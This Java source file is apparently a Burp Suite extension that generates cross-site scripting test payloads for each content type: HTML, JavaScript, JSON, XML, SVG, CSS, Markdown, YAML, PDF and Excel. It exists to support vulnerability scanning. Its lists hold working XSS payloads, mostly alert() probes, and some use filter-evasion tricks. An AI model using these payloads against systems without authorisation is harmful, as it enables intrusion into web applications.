package burp;

import java.util.*;

/**
 * ADVANCED: Content-Specific Payload Generator
 * Generates robust attack payloads based on detected content type
 * This makes detection more effective by using content-appropriate payloads
 */
public class ContentSpecificPayloadGenerator {
    
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    
    // HTML content payloads
    private static final String[] HTML_CONTENT_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<form><button formaction=javascript:alert('XSS')>X</button></form>",
        "<math><mi xlink:href=javascript:alert('XSS')>X</mi></math>"
    };
    
    // JavaScript content payloads
    private static final String[] JAVASCRIPT_CONTENT_PAYLOADS = {
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//",
        "';Function('alert(1)')();//",
        "';new Function('alert(1)')();//",
        "';setTimeout('alert(1)',0);//",
        "';setInterval('alert(1)',1000);//",
        "';[].constructor.constructor('alert(1)')();//",
        "';globalThis.alert(1);//",
        "';window['alert'](1);//",
        "';top['alert'](1);//",
        "';parent['alert'](1);//",
        "';self['alert'](1);//",
        "';frames['alert'](1);//",
        "';content['alert'](1);//"
    };
    
    // JSON content payloads
    private static final String[] JSON_CONTENT_PAYLOADS = {
        "\";alert('XSS');//",
        "';alert('XSS');//",
        "\",\"x\":\"<script>alert(1)</script>\"}",
        "{\"x\":\"<script>alert(1)</script>\"}",
        "{\"callback\":\"<script>alert(1)</script>\"}",
        "{\"jsonp\":\"<script>alert(1)</script>\"}",
        "?callback=<script>alert(1)</script>",
        "?jsonp=<script>alert(1)</script>",
        "?jsoncallback=<script>alert(1)</script>",
        "callback({\"x\":\"<script>alert(1)</script>\"})",
        "jsonp({\"x\":\"<script>alert(1)</script>\"})"
    };
    
    // XML content payloads
    private static final String[] XML_CONTENT_PAYLOADS = {
        "<?xml version=\"1.0\"?><x><script>alert(1)</script></x>",
        "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
        "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"javascript:alert(1)\">]><x>&xxe;</x>",
        "<x xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"javascript:alert(1)\"/></x>",
        "<x><?pi <script>alert(1)</script>?></x>",
        "<x><!--<script>alert(1)</script>--></x>",
        "<x:svg xmlns:x=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>"
    };
    
    // SVG content payloads
    private static final String[] SVG_CONTENT_PAYLOADS = {
        "<svg onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        "<svg><set onbegin=alert('XSS') attributeName=x>",
        "<svg><animateTransform onbegin=alert('XSS') type=rotate>",
        "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
        "<svg><use href=javascript:alert('XSS')>",
        "<svg><image href=javascript:alert('XSS')>",
        "<svg><a href=javascript:alert('XSS')>",
        "<svg><script href=data:text/javascript,alert('XSS')>"
    };
    
    // CSS content payloads
    private static final String[] CSS_CONTENT_PAYLOADS = {
        "expression(alert('XSS'))",
        "-moz-binding:url('javascript:alert(1)')",
        "background:url('javascript:alert(1)')",
        "@import'javascript:alert(1)'",
        "behavior:url('javascript:alert(1)')",
        "-o-link:'javascript:alert(1)'",
        "-o-link-source:'javascript:alert(1)'",
        "body{background:url('javascript:alert(1)')}",
        "*{background:url('javascript:alert(1)')}",
        "div{background:url('javascript:alert(1)')}"
    };
    
    // Plain text payloads (may be rendered as HTML)
    private static final String[] PLAIN_TEXT_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:alert('XSS')"
    };
    
    // Markdown content payloads
    private static final String[] MARKDOWN_PAYLOADS = {
        "[X](javascript:alert('XSS'))",
        "![X](javascript:alert('XSS'))",
        "<script>alert('XSS')</script>",
        "```<script>alert('XSS')</script>```",
        "![X](x\"onerror=\"alert('XSS')\")"
    };
    
    // YAML content payloads
    private static final String[] YAML_PAYLOADS = {
        "x: \"<script>alert(1)</script>\"",
        "x: '<script>alert(1)</script>'",
        "x: !!js/function \"function(){alert(1)}\"",
        "x: !!js/eval \"alert(1)\""
    };
    
    // PDF content payloads
    private static final String[] PDF_PAYLOADS = {
        "/JavaScript (alert('XSS'))",
        "/JS (alert('XSS'))",
        "/OpenAction (alert('XSS'))",
        "/AA (alert('XSS'))"
    };
    
    // Excel content payloads
    private static final String[] EXCEL_PAYLOADS = {
        "=HYPERLINK(\"javascript:alert('XSS')\",\"X\")",
        "=CONCATENATE(\"<script>alert('XSS')</script>\")",
        "=CHAR(60)&\"script>alert('XSS')</script>\""
    };
    
    public ContentSpecificPayloadGenerator(IBurpExtenderCallbacks callbacks, Settings settings) {
        this.callbacks = callbacks;
        this.settings = settings;
    }

    // Verbose-only info logging (these fire on every parameter and are noise by default)
    private void log(String msg) {
        if (settings != null && settings.getVerboseLogging()) {
            callbacks.printOutput(msg);
        }
    }
    
    /**
     * Generate payloads based on detected content type and reflection context
     * CRITICAL: Payloads must be fully relevant to the specific context
     */
    public List<String> generatePayloadsForContentType(String contentType, String reflectionContext) {
        List<String> payloads = new ArrayList<>();
        
        if (contentType == null && reflectionContext == null) {
            return payloads;
        }
        
        String lowerContentType = contentType != null ? contentType.toLowerCase() : "";
        String lowerContext = reflectionContext != null ? reflectionContext.toLowerCase() : "";
        
        // CRITICAL: HTML content - only add HTML payloads for HTML contexts
        if (lowerContentType.contains("text/html") || lowerContentType.contains("application/xhtml") ||
            lowerContext.contains("html") || lowerContext.contains("body") || 
            lowerContext.contains("html_body") || lowerContext.contains("html_tag")) {
            payloads.addAll(Arrays.asList(HTML_CONTENT_PAYLOADS));
            log("[ContentType] Detected HTML - Added " + HTML_CONTENT_PAYLOADS.length + " HTML-specific payloads");
        }
        
        // CRITICAL: JavaScript content - only add JS payloads for JavaScript contexts
        if (lowerContentType.contains("javascript") || lowerContentType.contains("ecmascript") ||
            lowerContext.contains("javascript") || lowerContext.contains("script") ||
            lowerContext.contains("javascript_string") || lowerContext.contains("javascript_execution")) {
            payloads.addAll(Arrays.asList(JAVASCRIPT_CONTENT_PAYLOADS));
            log("[ContentType] Detected JavaScript - Added " + JAVASCRIPT_CONTENT_PAYLOADS.length + " JavaScript-specific payloads");
        }
        
        // CRITICAL: JSON content - only add JSON payloads for JSON contexts
        if (lowerContentType.contains("json") || lowerContext.contains("json") ||
            lowerContext.contains("json_string") || lowerContext.contains("json_value")) {
            payloads.addAll(Arrays.asList(JSON_CONTENT_PAYLOADS));
            log("[ContentType] Detected JSON - Added " + JSON_CONTENT_PAYLOADS.length + " JSON-specific payloads");
        }
        
        // XML content
        if (lowerContentType.contains("xml") || lowerContext.contains("xml")) {
            payloads.addAll(Arrays.asList(XML_CONTENT_PAYLOADS));
            log("[ContentType] Detected XML - Added " + XML_CONTENT_PAYLOADS.length + " XML-specific payloads");
        }
        
        // SVG content
        if (lowerContentType.contains("svg") || lowerContext.contains("svg")) {
            payloads.addAll(Arrays.asList(SVG_CONTENT_PAYLOADS));
            log("[ContentType] Detected SVG - Added " + SVG_CONTENT_PAYLOADS.length + " SVG-specific payloads");
        }
        
        // CSS content
        if (lowerContentType.contains("css") || lowerContext.contains("css") || lowerContext.contains("style")) {
            payloads.addAll(Arrays.asList(CSS_CONTENT_PAYLOADS));
            log("[ContentType] Detected CSS - Added " + CSS_CONTENT_PAYLOADS.length + " CSS-specific payloads");
        }
        
        // Plain text (may be rendered)
        if (lowerContentType.contains("text/plain") || lowerContentType.contains("text/")) {
            payloads.addAll(Arrays.asList(PLAIN_TEXT_PAYLOADS));
            log("[ContentType] Detected Plain Text - Added " + PLAIN_TEXT_PAYLOADS.length + " plain text payloads");
        }
        
        // Markdown content
        if (lowerContentType.contains("markdown")) {
            payloads.addAll(Arrays.asList(MARKDOWN_PAYLOADS));
            log("[ContentType] Detected Markdown - Added " + MARKDOWN_PAYLOADS.length + " Markdown-specific payloads");
        }
        
        // YAML content
        if (lowerContentType.contains("yaml")) {
            payloads.addAll(Arrays.asList(YAML_PAYLOADS));
            log("[ContentType] Detected YAML - Added " + YAML_PAYLOADS.length + " YAML-specific payloads");
        }
        
        // PDF content
        if (lowerContentType.contains("pdf")) {
            payloads.addAll(Arrays.asList(PDF_PAYLOADS));
            log("[ContentType] Detected PDF - Added " + PDF_PAYLOADS.length + " PDF-specific payloads");
        }
        
        // Excel content
        if (lowerContentType.contains("excel") || lowerContentType.contains("spreadsheet")) {
            payloads.addAll(Arrays.asList(EXCEL_PAYLOADS));
            log("[ContentType] Detected Excel - Added " + EXCEL_PAYLOADS.length + " Excel-specific payloads");
        }
        
        return payloads;
    }
}

